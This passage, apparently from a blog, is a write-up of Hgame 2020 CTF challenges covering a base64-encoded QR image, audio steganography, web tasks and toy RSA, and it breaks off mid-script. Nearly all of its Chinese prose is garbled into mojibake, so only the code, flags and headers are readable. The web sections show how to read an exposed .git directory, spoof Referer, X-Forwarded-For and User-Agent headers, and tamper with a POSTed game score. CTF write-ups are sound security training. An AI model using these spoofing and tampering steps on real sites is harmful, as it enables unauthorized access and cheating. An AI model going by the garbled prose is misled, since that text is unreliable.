class="language-none">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</code></pre><p>ä¸€çœ‹ç»“å°¾<code>==</code>ï¼Œåº”è¯¥æ˜¯base64ç¼–ç ï¼Œäºæ˜¯ç»§ç»­è§£å¯†ã€‚</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_signinProPlus.png" alt="base64è§£å¯†"></p><p>å™«æ˜¯ä¸ªPNGå›¾ç‰‡ã€‚åŠ ä¸Šå¤´è¡¥å…¨ <code>data:image/png;base64,</code>ã€‚è‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ï¼ŒçœŸä¼šç©ï¼Œæ˜¯ä¸ªäºŒç»´ç ã€‚</p><p>ï¼ˆä¹Ÿå¯ä»¥base64è§£å¯†åä¿å­˜ä¸ºäºŒè¿›åˆ¶æ–‡ä»¶ç„¶åæ‰“å¼€ã€‚</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_signinProPlus2.png" alt="äºŒç»´ç å›¾ç‰‡"></p><p>æ‰«ç å¾—åˆ°flagï¼š</p><p><code>hgame{3Nc0dInG_@lL_iN_0Ne!}</code></p><p>çœŸçš„ä¼šç©2333ï¼ˆï¼ˆ<em>å¥½ï¼Œæˆ‘ä¹Ÿè¦æ•´ä¸€ä¸ªå„ç§ç¼–ç çš„å˜»å˜»å˜»</em></p><blockquote><p><em>Reference:</em><br><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php">https://www.qqxiuzi.cn/bianma/kaisamima.php</a><br><a href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a>   </p></blockquote><hr><h3 id="æ¯æ—¥æ¨è"><a href="#æ¯æ—¥æ¨è" class="headerlink" title="æ¯æ—¥æ¨è"></a>æ¯æ—¥æ¨è</h3><p>å¾—åˆ°ä¸€ä¸ª<code>.pcapng</code>æŠ“åŒ…æ–‡ä»¶ï¼Œç”¨Wiresharkæ‰“å¼€ï¼ŒæŸ¥çœ‹httpï¼Œå‘ç°åº”è¯¥æ˜¯ä¸wordpressåšå®¢ç›¸å…³ã€‚</p><p>åˆ©ç”¨â€œæ–‡ä»¶-å¯¼å‡ºå¯¹è±¡-HTTPâ€ï¼Œåˆ†æå…¶ä¸­çš„å¯¹è±¡ã€‚</p><p>ç»“åˆé¢˜ç›®æç¤º</p><blockquote><p>ObjectNotFoundæ­£å¬ç€ç½‘æ˜“äº‘æ¯æ—¥æ¨èâ€¦</p></blockquote><p>å‘ç°äº†ä¸€ä¸ªä¸Šä¼ çš„ç½‘é¡µâ€”â€”</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation1.png" alt="HTTPå¯¹è±¡"></p><p>è¿™æ˜¯ä¸€ä¸ªæäº¤çš„è¡¨æ ¼ï¼Œå‘ç°äº†ä¸Šä¼ çš„æ–‡ä»¶ <code>song.zip</code>ï¼Œå°†å…¶æå–å‡ºæ¥ã€‚</p><p>å‹ç¼©åŒ…é‡Œæœç„¶æ˜¯ä¸€é¦–æ­Œï¼Œä¸”å¤‡æ³¨é‡Œæç¤ºæ˜¯6ä½æ•°å­—ã€‚</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation2.png" alt="form"></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation3.png" alt="å‹ç¼©åŒ…"></p><p>è€ƒè™‘åˆ°6ä½æ•°å­—ï¼Œç›´æ¥å°±æš´åŠ›ç ´è§£å¥½äº†ã€‚ï¼ˆå…¶å®è¿˜åœ¨æŠ“åŒ…æ–‡ä»¶é‡Œæ‰¾äº†è€åŠå¤©æ²¡æ‰¾åˆ°ï¼ˆï¼ˆï¼ˆ</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation4.png" alt="ç ´è§£å¾—åˆ°å£ä»¤"></p><p>åˆ©ç”¨å£ä»¤<code>759371</code>è§£å‹å¾—åˆ°mp3æ–‡ä»¶ã€‚</p><p>ä¸€å¼€å§‹æ‰“å¼€010editoræ‰¾ï¼Œæ²¡æœ‰ã€‚</p><p>foremostæå–å¾—åˆ°äº†å°é¢å›¾ï¼Œä¹Ÿæ²¡æœ‰éšå†™ã€‚</p><p>çœ‹æ¥åœ¨éŸ³é¢‘é‡Œäº†ï¼ŒçŒœæƒ³å°±æ˜¯<strong>éŸ³é¢‘éšå†™</strong>å˜›ã€‚</p><p>æ—¢ç„¶æ˜¯MP3ï¼Œå…ˆè¯•è¯•<code>MP3StegoDecode</code>ï¼Œç»“æœä¹ˆå¾—ã€‚</p><pre class="language-none"><code class="language-none">the bit stream file I Love Mondays.mp3 is a BINARY fileHDR: s=FFF, id=1, l=1, ep=on, br=4, sf=3, pd=0, pr=0, m=0, js=0, c=0, o=0, e=0alg.=MPEG-1, layer=I, tot bitrate=128, sfrq=0.0mode=stereo, sblim=32, jsbd=32, ch=2[Frame    3]OpenTable: could not find tables/huffdecCheck local directory './tables/'Please check huffman table 'huffdec'</code></pre><p>ä¸Šç½‘æ‰¾äº†ä¸€ä¸‹ï¼Œä¸‹äº†ä¸ªéŸ³é¢‘å¤„ç†è½¯ä»¶**<em>Audacity**</em>ã€‚ï¼ˆå…è´¹å¼€æºè·¨å¹³å°ï¼Œè¿˜ä¸é”™</p><blockquote><p>Free, open source, cross-platform audio software. <em>Audacity</em> is an easy-to-use, multi-track audio editor and recorder for Windows, Mac OS X, GNU/Linuxâ€¦</p></blockquote><p>æŸ¥çœ‹é¢‘è°±ï¼Œå¾—åˆ°flagï¼š</p><p><code>hgame{I_love_EDM233}</code></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_recommendation5.png" alt="æŸ¥çœ‹é¢‘è°±å›¾å¾—åˆ°flag"></p><blockquote><p><strong><em>Electronic Dance Music</em></strong> <em>ï¼ˆç”µå­èˆæ›²ï¼‰</em>å¯è¿˜è¡Œã€‚</p><p>ç¬¬ä¸€æ¬¡åšéŸ³é¢‘éšå†™çš„é¢˜ï¼Œå“‡è„‘æ´çœŸå¤§ï¼Œå¤ªæœ‰æ„æ€äº†233333</p></blockquote><hr><hr><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Cosmos-çš„åšå®¢"><a href="#Cosmos-çš„åšå®¢" class="headerlink" title="Cosmos çš„åšå®¢"></a>Cosmos çš„åšå®¢</h3><p><a href="http://cosmos.hgame.n3ko.co/">http://cosmos.hgame.n3ko.co/</a></p><p>å…ˆåœ¨ç½‘é¡µé‡Œæ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°emmm</p><p>åæ¥å‘ç°ï¼Œæ—¢ç„¶è¯´<strong>ç‰ˆæœ¬ç®¡ç†å·¥å…·</strong>ï¼Œè¿˜æœ‰<strong>GitHub</strong>å˜›ã€‚</p><p>é‚£å°±æ„é€ <code>/.git/config</code>è¯•è¯•</p><p>æœç„¶â€”â€”</p><pre class="language-none"><code class="language-none">[core]repositoryformatversion = 0filemode = truebare = falselogallrefupdates = true[remote "origin"]url = https://github.com/FeYcYodhrPDJSru/8LTUKCL83VLhXbcfetch = +refs/heads/*:refs/remotes/origin/*</code></pre><p>å¥½ï¼Œè¿™ä¸ªGitHubä»“åº“æœ‰æˆï¼</p><p>è®¿é—®ä¸€æ³¢ï¼Œç„¶ååœ¨commité‡Œæ‰¾åˆ°äº†flagã€‚</p><p><img src="/2020/01/23/CTF_Hgame2020/web_Cosmos'sBlog.png" alt="web_Cosmos'sBlog"></p><p>base64è§£ç å¾—åˆ°flag</p><p><code>hgame{g1t_le@k_1s_danger0us_!!!!}</code></p><blockquote><p>/.gitç›®å½•å…¬å¼€è®¿é—®æ˜¯æŒºå±é™©çš„emmm  </p></blockquote><hr><h3 id="æ¥-å¤´-éœ¸-ç‹"><a href="#æ¥-å¤´-éœ¸-ç‹" class="headerlink" title="æ¥ å¤´ éœ¸ ç‹"></a>æ¥ å¤´ éœ¸ ç‹</h3><p><a href="http://kyaru.hgame.n3ko.co/">http://kyaru.hgame.n3ko.co/ </a></p><p>ç›´æ¥è®¿é—®ï¼Œæç¤º</p><blockquote><p>You need to come from <a href="https://vidar.club/">https://vidar.club/</a>.                    </p></blockquote><p>å¢åŠ è¯·æ±‚å¤´: <code>Referer: https://vidar.club/</code>ï¼Œé‡å‘åæç¤º</p><blockquote><p>You need to visit it locally.                    </p></blockquote><p>å¢åŠ è¯·æ±‚å¤´ï¼š<code>X-Forwarded-For: 127.0.0.1</code></p><blockquote><p>You need to use Cosmos Brower to visit.                    </p></blockquote><p>æ”¹UAï¼š<code>User-Agent: Cosmos </code></p><blockquote><p>The flag will be updated after 2077, please wait for it patiently.                    </p></blockquote><p>æ ¹æ®å“åº”å¤´ <code>Last-Modified: Fri, 01 Jan 2077 00:00:00 GMT</code>ï¼Œè¿›è¡Œä¿®æ”¹ã€‚æŠŠ <code>If-Unmodified-Since</code> è®¾ç½®åœ¨ <code>Last-Modified</code> ä¹‹åå°±å¯ä»¥äº†ã€‚</p><p>å¢åŠ è¯·æ±‚å¤´ï¼š<code>If-Unmodified-Since: Fri, 01 Jan 2077 00:00:00 GMT</code></p><p>å¾—åˆ°flag</p><p><code>hgame{W0w!Your_heads_@re_s0_many!}</code>                    </p><blockquote><p>è¿™é¢˜ä¸€æ³¢ä¸‰æŠ˜å•Šã€‚</p><p>æœ€åè¿™ä¸ªæ“ä½œè®©æˆ‘æƒ³åˆ°äº†ustcçš„hackgameé‡Œ<code>ä¿¡æ¯å®‰å…¨ 2077</code>é‚£é“é¢˜ï¼Œç„¶åå›å»çœ‹äº†ä¸€ä¸‹233.</p><p><strong><em>Referenceï¼š</em></strong></p><p><a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md">https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8_2077/README.md</a></p></blockquote><hr><h3 id="ğŸ”å°¼æ³°ç«"><a href="#ğŸ”å°¼æ³°ç«" class="headerlink" title="ğŸ”å°¼æ³°ç«"></a>ğŸ”å°¼æ³°ç«</h3><p>cxkæœ‰ç‚¹å¥½ç©2333</p><p><del>éšä¾¿ç©äº†ä¸€ä¸‹è§‰å¾—æœ‰ç‚¹æ— èŠï¼ˆx</del></p><p>çœ‹äº†ä¸€ä¸‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°æ˜¯ç”¨canvasç”»å¸ƒç”»å‡ºæ¥çš„ï¼Œäº¤äº’ç”¨çš„jsï¼Œæœ‰ç‚¹æ„æ€iã€‚</p><p>ç„¶åæ‰“å¼€äº†Burp Suiteï¼ŒæŠ“ä¸ªåŒ…çœ‹çœ‹å§ã€‚</p><p>å‘ç°æ¸¸æˆç»“æŸçš„æ—¶å€™ä¼šPOSTå½“å‰å¾—åˆ†ã€‚</p><p>ä¸å¤Ÿåˆ™æç¤º</p><blockquote><p>Your score must more than 30000 , then you can get the flag. Happy game!</p></blockquote><p>é‚£å°±æˆªåŒ…æ”¹åŒ…å¥½äº†å•¦ï¼Œç›´æ¥ç»™ä»–åŠ ä¸ª0.</p><p><img src="/2020/01/23/CTF_Hgame2020/web_cxk1.png" alt="æ”¹åŒ…"></p><p>è¿™å°±å‡ºæ¥äº†å‘€ï¼</p><p><img src="/2020/01/23/CTF_Hgame2020/web_cxk2.png" alt="cxk2"></p><p>â€‹    <code>hgame{j4vASc1pt_w1ll_tel1_y0u_someth1n9_u5efu1?!}</code></p><hr><h3 id="Code-World"><a href="#Code-World" class="headerlink" title="Code World"></a>Code World</h3><p><a href="http://codeworld.hgame.day-day.work/">http://codeworld.hgame.day-day.work/</a></p><p>å‘ç°é‡å®šå‘åˆ°äº† <a href="http://codeworld.hgame.day-day.work/new.php">http://codeworld.hgame.day-day.work/new.php</a></p><p>åŒæ—¶çœ‹åˆ°äº†ä¸€å¥js</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"This new site is building....But our stupid developer Cosmos did 302 jump to this page..F**k!"</span><span class="token punctuation">)</span></code></pre><p>curlçœ‹äº†ä¸€ä¸‹ä¹‹å‰çš„ç½‘é¡µ405ã€‚</p><p>å˜¤ä¸ä¼šäº†ã€‚ã€‚</p><blockquote><p><strong>20200125æ›´æ–°ï¼š</strong></p><p>çœ‹äº†å®˜æ–¹WPï¼Œå‘ç°è¦æŠŠè¯·æ±‚æ”¹æˆPOSTå‘åˆ°åŸé¡µé¢ã€‚</p><p>äºæ˜¯è¯•äº†ä¸€ä¸‹ï¼Œè¿”å›</p><pre class="language-none"><code class="language-none">äººé¸¡éªŒè¯ç›®å‰å®ƒåªæ”¯æŒé€šè¿‡urlæäº¤å‚æ•°æ¥è®¡ç®—ä¸¤ä¸ªæ•°çš„ç›¸åŠ ï¼Œå‚æ•°ä¸ºaç°åœ¨,éœ€è¦è®©ç»“æœä¸º10</code></pre><p>å†æ„é€ å‚æ•°aï¼Œæ ¹æ®æç¤º<code>å‚æ•°açš„æäº¤æ ¼å¼ä¸º: ä¸¤æ•°ç›¸åŠ (a=b+c)</code>ï¼Œè€ƒè™‘åˆ°<code>+</code>çš„Urlencodeä¸º%2b</p><p>äºæ˜¯æ„é€ <code>/?a=2%2b8</code>ï¼Œå¾—åˆ°flag</p><pre class="language-none"><code class="language-none">The result is: 10hgame{C0d3_1s_s0_S@_sO_C0ol!}</code></pre></blockquote><hr><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="InfantRSA"><a href="#InfantRSA" class="headerlink" title="InfantRSA"></a>InfantRSA</h3><p>é¢˜ç›®ç»™äº†å¦‚ä¸‹çš„ä»£ç â€”â€”</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">from</span> secret <span class="token keyword">import</span> flag<span class="token keyword">assert</span> flag<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'hgame{'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> flag<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">b'}'</span><span class="token punctuation">)</span>m <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>flag<span class="token punctuation">,</span> byteorder<span class="token operator">=</span><span class="token string">'big'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token number">681782737450022065655472455411</span>q <span class="token operator">=</span> <span class="token number">675274897132088253519831953441</span>e <span class="token operator">=</span> <span class="token number">13</span>c <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> e<span class="token punctuation">,</span> p<span class="token operator">*</span>q<span class="token punctuation">)</span><span class="token keyword">assert</span> c <span class="token operator">==</span> <span class="token number">275698465082361070145173688411496311542172902608559859019841</span></code></pre><p>RSAå•¦ã€‚è¿™é‡Œå°±<strong>æ ¹æ®å¯†æ–‡CæŠŠæ˜æ–‡Mç»™æ‰¾å‡ºæ¥</strong>ã€‚</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_InfantRSA.png" alt="InfantRSA"></p><pre class="language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> <span class="token number">275698465082361070145173688411496311542172902608559859019841</span>n <span class="token operator">=</span> <span class="token number">460390767897997184102969941508880171690097589571068900519251</span>d <span class="token operator">=</span> <span class="token number">141658697814768364339375366617699419709389378231351875726277</span>m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token comment"># å¾—åˆ°mä¸º39062110472669388914389428064087335236334831991333245</span><span class="token comment"># å†å°†æ•°å­—mè½¬æ¢ä¸ºå­—ç¬¦ä¸²</span>    <span class="token keyword">import</span> binascii    flag <span class="token operator">=</span> binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>æˆ–è€… ç”¨ä¸Šé¢çš„å·¥å…·é‡Œçš„<em>Test</em>ï¼š</p><p><img src="/2020/01/23/CTF_Hgame2020/crypto_InfantRSA2.png" alt="test"></p><p>å¾—åˆ°flagï¼š</p><p><code>hgame{t3Xt6O0k_R5A!!!}</code></p><blockquote><p><em>Reference:</em>  ä»‹ç»RSAçš„<br><a href="https://www.freebuf.com/articles/others-articles/166049.html">https://www.freebuf.com/articles/others-articles/166049.html</a><br><a href="https://www.freebuf.com/articles/others-articles/161475.html">https://www.freebuf.com/articles/others-articles/161475.html</a><br><a href="https://www.k2zone.cn/?p=2157">https://www.k2zone.cn/?p=2157</a></p></blockquote><hr><h3 id="Reorder"><a href="#Reorder" class="headerlink" title="Reorder"></a>Reorder</h3><p><code>nc 47.98.192.231 25002</code></p><p>æ•²ä¸ªå›è½¦å°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªä¹±åºçš„å­—ç¬¦ä¸²ï¼Œåˆšå¼€å§‹è¿˜ä»¥ä¸ºæ˜¯åˆ†ç»„æ¥ç€ï¼Œç„¶åè¯•äº†åŠå¤©ä¸å¯¹emmmã€‚</p><p>åæ¥æ‰å‘ç°ï¼ŒåŸæ¥æ¯æ¬¡çš„ç»“æœéƒ½ä¸ä¸€æ ·233ï¼Œæ¯”å¦‚ä¸‹é¢æ˜¯ä¸€äº›å®éªŒç»“æœã€‚</p><pre class="language-none"><code class="language-none">Rua!!!$hLjgp+ame{UI5mtA3}u_!iP!RmTn0eT   Rua!!!$mtgIUeapjm{h+5LAeT_nTRP!u!m3i0}  Rua!!!t5m{ag+eh$UjILmpT0!mP_iR3ATun}e!  $mhmjI5te+{apUgLAe3!un0TRimP!T_}  mat5jIpmg$heLU{+!PT0un!e_A3R}Tmi  {LUpt5mI+e$mgajhm}T!T0!niRAe_Pu3  $Umm+g{LIe5jphtaAT!ei_m}nR0u!3TP  5I{eLmt+ha$mgpjU0nmR}eTi3PA!_!uT  Lm$jham{pUt+5Ige}!Au3Pem!TTi0n_R</code></pre><p><strong>æ—¢ç„¶æ˜¯ä¹±åºå§ï¼Œé‚£å°±çœ‹çœ‹åˆ°åº•æ˜¯ä»€ä¹ˆä¸ªé¡ºåºå¥½äº†ï¼</strong></p><p>ä¸Šé¢å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º32ï¼Œäºæ˜¯æ„é€ å­—ç¬¦ä¸² </p><p><code>str1='123456abcdefghijklmnopqrstuvwxyz'</code></p><p>è¾“å…¥åå¾—åˆ° <code>str2='jhca1346ibdefg25zxsqkmnpyrtuvwlo'</code>  </p><p>è¯•äº†å‘ç°è¯¥é¡ºåºä¸å˜ï¼Œäºæ˜¯å¾—åˆ°ç¼–ç çš„å¯¹åº”å…³ç³»ï¼ˆæ­£å˜æ¢é€†å˜æ¢å˜›233333ï¼‰</p><pre class="language-python" data-language="python"><code class="language-python">str1<span class="token operator">=</span><span class="token string">'123456abcdefghijklmnopqrstuvwxyz'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span>str2<span class="token operator">=</span><span class="token string">'jhca1346ibdefg25zxsqkmnpyrtuvwlo'</span><span class="token comment"># æ­£å˜æ¢</span>location<span class="token operator">=</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    location<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>str1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token comment"># [15, 13, 8, 6, 0, 2, 3, 5, 14, 7, 9, 10, 11, 12, 1, 4, 31, 29, 24, 22, 16, 18, 19, 21, 30, 23, 25, 26, 27, 28, 17, 20]</span><span class="token comment"># é€†å˜æ¢</span>ilocation<span class="token 